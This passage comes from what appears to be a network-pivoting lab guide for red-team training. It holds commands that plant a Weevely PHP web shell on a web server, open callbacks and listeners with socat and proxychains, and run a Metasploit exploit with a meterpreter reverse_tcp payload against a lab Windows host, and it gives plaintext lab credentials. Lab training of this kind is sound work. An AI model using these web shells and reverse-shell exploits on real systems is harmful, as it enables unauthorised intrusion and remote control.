cat /tmp/PROOF
proxychains -q callMe.sh linux 80 <ATTACK_BOX_IP> 4444 tcp
cat /tmp/PROOF
	#Notice we got a callback through our socks proxy
```


## Weevely

```
[[ Weevely~Demo ]]*
cd tools/weevely
./weevely.py generate password ./weevely.php
cat weevely.php | ssh root@lamp 'cat - |sudo tee /var/www/html/weevely.php'
./weevely.py http://lamp/weevely.php password
    #You are now dropped into a pretty cool shell.  Lots of functionality here, but we will only focus on the web proxying
:net_proxy
```

```
[[ Weevely~CallMe ]]
lsof -i tcp:4444
	socat -u tcp-listen:4444,fork open:/tmp/PROOF,create,append &
cat /tmp/PROOF


lsof -i tcp:8080
    #Lets make sure our http proxy is working correctly

cat /tmp/PROOF
curl  -x http://127.0.0.1:8080 "http://linux:80/send-packet"  -H 'Content-Type: application/json' --data-raw '{"ip":"'kali'","port":"'4444'","protocol":"'tcp'"}'
    #I tried fixing this up with proxychains and callMe.sh, but I got some errors.  This is sufficient to demonstrate we can proxy through with Weevely.
cat /tmp/PROOF
```

### Clean up

```
pkill weevely.py
lsof -i tcp:8080
```


### Exploitation

#### Linux exploitation

The linux machine at 10.X.22.50 is vulnerable to CVE-2024-47176, a UDP-based exploit against CUPS 2.4.2 and possibly earlier versions.

It is also vulnerable to CVE-2025-32433 on port 2222. CVE-2025-32433 is an unauthenticated RCE against the SSH server for Erlang/OTP.

Both vulnerabilities are hosted in docker containers through Vulhub. Netcat, curl and socat have been installed in the container to allow for more pivoting.

See `~/tools/exploits/` for the proof of concept exploits.

#### Windows exploitation

The Windows machine at 10.X.22.60 is vulnerable to CVE-2022-3229, an authentication bypass in Unified Remote version 3.11.0.2483 and prior.  Windows Defender has been turned off to allow you to use the metasploit module for this exploit.

```
msfconsole -q
use exploit/windows/misc/unified_remote_rce
set RHOST 10.X.22.60
set LHOST eth0 
set payload windows/meterpreter/reverse_tcp
run
```

You can also log in as root using the SSH key on the kali machine, or with plaintext credentials over winrm, ssh or RDP:

root:PivotLab1!

# References

- https://github.com/opsdisk/the_cyber_plumbers_handbook
- http://www.dest-unreach.org/socat/doc/socat-tun.html
- https://swisskyrepo.github.io/InternalAllTheThings/redteam/pivoting/network-pivoting-techniques/
- https://blog.raw.pm/en/state-of-the-art-of-network-pivoting-in-2019/
- https://latest.gost.run/en/
- https://gost.run/en/tutorials/
- https://www.sans.org/blog/using-the-ssh-konami-code-ssh-control-sequences/
- https://gitbook.seguranca-informatica.pt/cheat-sheet-1/stuff/pivoting


